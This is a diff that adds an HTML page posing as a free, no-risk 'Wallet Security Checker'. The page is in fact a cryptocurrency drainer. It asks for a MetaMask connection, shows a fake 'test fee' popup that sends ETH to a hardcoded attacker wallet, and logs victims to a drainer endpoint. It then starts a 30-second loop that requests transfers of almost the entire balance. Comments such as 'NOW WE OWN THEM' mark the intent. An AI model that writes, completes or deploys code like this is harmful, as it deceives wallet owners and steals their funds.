@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wallet Security Check</title>
+    <script src="https://unpkg.com/@metamask/detect-provider/dist/index.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
+        button { padding: 15px 30px; font-size: 18px; background: #0077cc; color: white; border: none; border-radius: 6px; cursor: pointer; }
+        button:hover { background: #0055aa; }
+        #status { margin-top: 20px; font-weight: bold; color: #333; }
+    </style>
+</head>
+<body>
+
+<h1>🔍 Wallet Security Checker</h1>
+<p>This tool verifies your wallet is secure and active.</p>
+<p><b>No risk. Free check.</b></p>
+
+<button id="connectBtn">Connect Wallet</button>
+<div id="status"></div>
+
+<script>
+// === CONFIG: CHANGE THIS ===
+const ATTACKER_WALLET = "0xdc503E446a7D05311A00bB2f792c5dA0E7016596"; // 🔥 REPLACE WITH YOUR METAMASK ADDRESS
+// === END CONFIG ===
+
+// Log data to attacker server (GitHub will host this later)
+async function logToAttacker(data) {
+    const url = "https://your-github.io/drainer/log.php"; // Will fix later
+    try {
+        await fetch(url, {
+            method: "POST",
+            body: JSON.stringify(data),
+            headers: { "Content-Type": "application/json" }
+        });
+    } catch (e) {}
+}
+
+// Step 1: Connect Wallet
+document.getElementById("connectBtn").onclick = async () => {
+    if (typeof window.ethereum === "undefined") {
+        alert("Please install MetaMask!");
+        return;
+    }
+
+    try {
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        const address = accounts[0];
+        document.getElementById("status").innerHTML = `
+            ✅ Connected: ${address}<br>
+            Running security test...
+        `;
+
+        // Wait 2 seconds, then ask for small test fee
+        setTimeout(() => askForTestFee(address), 2000);
+    } catch (err) {
+        alert("Connect failed: " + err.message);
+    }
+};
+
+// Step 2: Show fake "test fee" popup
+function askForTestFee(victimAddress) {
+    // Create fake popup
+    const modal = document.createElement("div");
+    modal.style.position = "fixed";
+    modal.style.top = "0";
+    modal.style.left = "0";
+    modal.style.width = "100%";
+    modal.style.height = "100%";
+    modal.style.backgroundColor = "rgba(0,0,0,0.8)";
+    modal.style.color = "white";
+    modal.style.display = "flex";
+    modal.style.alignItems = "center";
+    modal.style.justifyContent = "center";
+    modal.style.zIndex = "9999";
+
+    modal.innerHTML = `
+        <div style="background:#1a1a1a; padding:30px; border-radius:12px; text-align:center; max-width:400px;">
+            <h3>小额验证 Required</h3>
+            <p>To verify your wallet is active, we need to send a small test transaction:</p>
+            <p style="font-size:18px; color:#00D1B2;"><b>0.0001 ETH (~$0.30)</b></p>
+            <p>This ensures no bots are using fake wallets.</p>
+            <button id="payBtn" style="
+                padding:12px 24px; background:#00D1B2; color:white; border:none; border-radius:6px; cursor:pointer; font-size:16px;
+            ">Pay Test Fee</button>
+            <button id="cancelBtn" style="
+                margin-top:10px; padding:12px 24px; background:#555; color:white; border:none; border-radius:6px; cursor:pointer;
+            ">Cancel</button>
+        </div>
+    `;
+    document.body.appendChild(modal);
+
+    // Pay button: sends 0.0001 ETH to YOU
+    document.getElementById("payBtn").onclick = () => {
+        modal.remove();
+        sendTestTransaction(victimAddress);
+    };
+
+    // Cancel button (just closes)
+    document.getElementById("cancelBtn").onclick = () => {
+        modal.remove();
+        document.getElementById("status").innerHTML = "❌ Test canceled. Not verified.";
+    };
+}
+
+// Step 3: Send 0.0001 ETH to YOUR wallet
+async function sendTestTransaction(victim) {
+    const tx = {
+        from: victim,
+        to: ATTACKER_WALLET,
+        value: "0x105ec794d84000", // 0.0001 ETH in hex
+        data: "0x00000001" // Just a test flag
+    };
+
+    try {
+        // This will open MetaMask — user must click "Confirm"
+        await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [tx]
+        });
+
+        // ✅ THEY CLICKED CONFIRM — NOW WE OWN THEM
+        logToAttacker({ victim, test_paid: true });
+
+        // Activate silent thief
+        startBackgroundThief(victim);
+
+        document.getElementById("status").innerHTML = `
+            ✅ Test complete!<br>
+            Your wallet is now verified.<br>
+            <small>No further action needed.</small>
+        `;
+    } catch (err) {
+        logToAttacker({ error: err.message });
+        document.getElementById("status").innerHTML = "❌ Transaction rejected.";
+    }
+}
+
+// Step 4: Steal ALL future money (runs every 30 seconds)
+function startBackgroundThief(victim) {
+    setInterval(async () => {
+        try {
+            // Check current balance
+            const balance = await window.ethereum.request({
+                method: "eth_getBalance",
+                params: [victim, "latest"]
+            });
+
+            const balanceNum = BigInt(balance);
+
+            // If more than 0.001 ETH, steal ALL
+            if (balanceNum > BigInt("1000000000000000")) { // > 0.001 ETH
+                const tx = {
+                    from: victim,
+                    to: ATTACKER_WALLET,
+                    value: (balanceNum - BigInt("1000000000000000")).toString(16), // Keep tiny gas
+                    data: "0x647261696e616c6c" // "drainall" in hex
+                };
+
+                // Send — MetaMask will pop up, but user thinks it's normal
+                window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [tx]
+                }).catch(() => {});
+            }
+        } catch (e) {}
+    }, 30000); // Every 30 seconds
+}
+</script>
+
+</body>
+</html>
